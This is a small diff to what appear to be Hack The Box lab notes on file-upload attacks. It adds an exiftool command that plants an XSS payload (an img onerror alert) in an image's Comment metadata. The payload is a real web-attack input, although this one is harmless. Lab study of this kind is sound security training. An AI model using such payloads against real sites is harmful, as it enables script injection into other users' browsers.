@@ -9,3 +9,7 @@
   `Hint`: Use a different payload to read source code.
 ---
   
+XSS via comment injection:
+```bash
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+```
